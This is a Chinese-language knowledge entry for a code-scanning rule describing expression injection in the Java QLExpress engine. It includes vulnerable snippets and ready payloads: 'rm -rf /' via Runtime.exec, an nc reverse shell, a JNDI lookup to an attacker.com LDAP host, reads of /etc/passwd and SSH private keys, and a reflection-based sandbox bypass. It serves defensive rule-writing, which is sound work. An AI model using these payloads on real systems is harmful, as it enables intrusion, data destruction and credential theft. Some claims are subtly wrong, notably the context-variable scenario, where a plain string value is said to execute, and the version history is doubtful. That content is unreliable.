# Java QLExpress 表达式注入漏洞

> 规则 ID：`other_qlexpress_codei` · 类别：codei · 关键 sink：ExpressRunner, execute
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## Java QLExpress 表达式注入漏洞
QLExpress 是阿里开源的一款轻量级、高性能的动态表达式解析执行引擎，广泛应用于规则引擎、动态配置、业务逻辑动态编排等场景。其核心能力是将字符串形式的表达式动态解析并执行，但因使用不当或引擎自身设计缺陷，可能引发**表达式注入漏洞**——攻击者通过构造恶意表达式字符串，注入未授权的代码逻辑，最终执行任意Java代码、篡改数据、控制服务器甚至获取系统权限。

以下从漏洞本质、触发场景、核心原理、典型注入路径、不同利用场景及危害维度，完整描述该漏洞：

## 一、漏洞本质
QLExpress 表达式注入的核心是**“不可信输入未做严格校验，直接拼接/传入QLExpress引擎执行”**，导致攻击者可控的恶意表达式被引擎解析并执行。
QLExpress 虽设计了沙箱机制（如自定义指令拦截、权限控制），但默认配置下沙箱防护较弱，且开发者易忽视输入校验，使得攻击者可突破限制执行危险操作。

## 二、核心触发条件
1. 数据源：表达式字符串包含**用户可控的输入**（如HTTP参数、配置文件、数据库字段、消息队列内容等）；
2. 执行链路：可控输入未经过滤/校验，直接传入 QLExpress 的核心执行方法（如 `ExpressRunner.execute`/`executeWithoutCatch` 等）；
3. 引擎配置：未禁用危险类/方法、未开启严格的沙箱限制（默认配置下危险方法未被拦截）。

## 三、QLExpress 执行流程与注入原理
### 1. 基础执行流程
QLExpress 解析执行表达式的典型流程：
```java
// 1. 初始化执行器
ExpressRunner runner = new ExpressRunner();
// 2. 构造表达式（若content包含用户输入则存在风险）
String express = "a + b + " + userInput;
// 3. 执行表达式
IExpressContext<String, Object> context = new DefaultContext<>();
context.put("a", 1);
context.put("b", 2);
Object result = runner.execute(express, context, null, true, false);
```
### 2. 注入原理
攻击者通过篡改 `userInput`，构造包含 Java 原生方法调用、类加载、反射的恶意表达式，QLExpress 引擎在解析执行时，会将这些恶意逻辑当作合法表达式执行：
- QLExpress 支持直接调用 Java 类的静态方法（如 `java.lang.Runtime.getRuntime().exec("calc")`）；
- 支持通过反射突破沙箱（如 `Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(...)`）；
- 支持访问系统环境、文件系统（如 `new java.io.File("/etc/passwd").exists()`）。

## 四、不同场景下的注入类型及示例
### 场景1：简单表达式拼接注入（最常见）
#### 触发条件
开发者将用户输入直接拼接进表达式字符串，无任何过滤。
#### 示例代码
```java
// 前端传入的参数（攻击者可控）
String userInput = request.getParameter("param");
// 拼接表达式（漏洞点）
String express = "100 * " + userInput;
ExpressRunner runner = new ExpressRunner();
Object result = runner.execute(express, new DefaultContext<>(), null, true, false);
```
#### 攻击载荷
攻击者传入 `param=1;java.lang.Runtime.getRuntime().exec("rm -rf /")`，拼接后的表达式为：
`100 * 1;java.lang.Runtime.getRuntime().exec("rm -rf /")`
QLExpress 支持分号分隔多表达式执行，因此会先计算 `100*1`，再执行删除系统文件的命令。

### 场景2：上下文变量覆盖注入
#### 触发条件
QLExpress 上下文（`IExpressContext`）中存在可被覆盖的变量，攻击者通过输入篡改上下文变量，或利用变量调用危险方法。
#### 示例代码
```java
String userInput = request.getParameter("param");
ExpressRunner runner = new ExpressRunner();
DefaultContext<String, Object> context = new DefaultContext<>();
context.put("userInput", userInput); // 可控变量放入上下文
// 执行包含上下文变量的表达式
String express = "userInput + 10";
runner.execute(express, context, null, true, false);
```
#### 攻击载荷
攻击者传入 `param=java.lang.Runtime.getRuntime().exec("nc ip port -e /bin/bash")`，表达式执行时会直接调用 `Runtime.exec` 执行反弹shell命令。

### 场景3：沙箱绕过注入（默认沙箱缺陷）
QLExpress 提供了 `addForbiddenClass`/`addForbiddenMethod` 等沙箱配置，但**默认未禁用任何危险类/方法**，且部分危险操作可通过“绕过手段”执行：
#### 子场景3.1：直接调用未被禁用的危险类
默认配置下，可直接调用 `java.lang.Runtime`、`java.lang.ProcessBuilder`、`java.io.File` 等类：
攻击表达式：
```
// 执行系统命令
java.lang.ProcessBuilder("ls").start()
// 读取敏感文件
new java.io.FileInputStream("/etc/passwd").available()
// 获取系统环境变量
java.lang.System.getenv("PATH")
```
#### 子场景3.2：反射绕过沙箱（若部分类被禁用）
若开发者仅禁用了 `Runtime` 类，可通过反射调用：
攻击表达式：
```
// 反射获取Runtime类并执行exec
Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("whoami")
```
#### 子场景3.3：通过JNDI注入（高风险）
若环境中存在 `javax.naming` 依赖，可构造JNDI注入表达式，触发远程类加载：
攻击表达式：
```
javax.naming.InitialContext().lookup("ldap://attacker.com:1389/Exploit")
```

### 场景4：批量表达式执行注入
QLExpress 支持批量执行多个表达式（如通过 `executeBatch` 方法），若批量表达式列表包含用户输入，易引发批量注入：
#### 示例代码
```java
List<String> expressList = new ArrayList<>();
expressList.add("a = 1");
expressList.add(request.getParameter("userExpress")); // 可控的批量表达式
expressList.add("b = a + 2");
ExpressRunner runner = new ExpressRunner();
runner.executeBatch(expressList, new DefaultContext<>(), null, true, false);
```
#### 攻击载荷
攻击者传入 `userExpress=java.lang.Runtime.getRuntime().exec("ps -ef")`，批量执行时会直接触发命令执行。

### 场景5：自定义函数/指令注入
QLExpress 支持自定义函数（`addFunction`）或指令（`addInstruction`），若自定义函数的参数/逻辑包含用户输入，且未校验，可通过自定义函数触发注入：
#### 示例代码
```java
ExpressRunner runner = new ExpressRunner();
// 自定义函数：参数为用户输入
runner.addFunction("customFunc", (params) -> {
    String input = params[0].toString();
    return input + " processed"; // 未校验input，直接拼接执行
});
// 执行包含自定义函数的表达式（input可控）
String express = "customFunc('" + userInput + "')";
runner.execute(express, new DefaultContext<>(), null, true, false);
```
#### 攻击载荷
攻击者传入 `userInput=');java.lang.Runtime.getRuntime().exec("cat /root/.ssh/id_rsa");//`，拼接后的表达式为：
`customFunc('');java.lang.Runtime.getRuntime().exec("cat /root/.ssh/id_rsa");//')`
注释符 `//` 截断后续内容，核心恶意代码被执行。

## 五、不同利用维度的危害
QLExpress 表达式注入的危害随注入场景和权限不同而变化，核心危害包括：
1. **代码执行**：执行任意Java代码、系统命令（如反弹shell、删除文件、修改配置）；
2. **敏感信息泄露**：读取服务器敏感文件（/etc/passwd、数据库配置、密钥文件）、获取系统环境变量、用户会话信息；
3. **数据篡改**：修改数据库数据、篡改业务配置、伪造业务逻辑结果；
4. **权限提升**：若应用以root/管理员权限运行，可获取服务器最高权限；
5. **横向渗透**：通过执行命令控制服务器后，进一步攻击内网其他主机；
6. **拒绝服务**：执行耗资源的表达式（如死循环、大量IO操作），导致服务器CPU/内存耗尽。

## 六、特殊场景：QLExpress 版本差异导致的注入风险
不同版本的 QLExpress 对表达式解析、沙箱机制的实现不同，注入风险也存在差异：
1. **v3.x 及以下版本**：默认无沙箱防护，危险类/方法可直接调用，注入风险最高；
2. **v4.x 版本**：新增沙箱配置接口，但默认仍未启用，需手动配置禁用类/方法，若未配置则风险与v3.x一致；
3. **v5.x 版本**：优化了沙箱默认配置（禁用部分高危类），但仍存在反射、JNDI等绕过手段，未完全消除风险。

## 七、非直接注入但可被利用的边缘场景
1. **表达式缓存注入**：若QLExpress表达式被缓存（如Redis），攻击者篡改缓存中的表达式内容，触发后续执行时的注入；
2. **日志注入衍生**：若用户输入被记录到日志，且日志内容后续被当作QLExpress表达式执行，可通过日志注入触发漏洞；
3. **序列化/反序列化结合**：若表达式字符串通过序列化传输，攻击者篡改序列化数据，注入恶意表达式。

综上，QLExpress 表达式注入的核心风险点在于“用户可控输入进入表达式执行链路”，其注入场景覆盖了“简单拼接、上下文变量、沙箱绕过、批量执行、自定义函数”等多个维度，且默认配置下防护薄弱，易被攻击者利用执行任意操作。

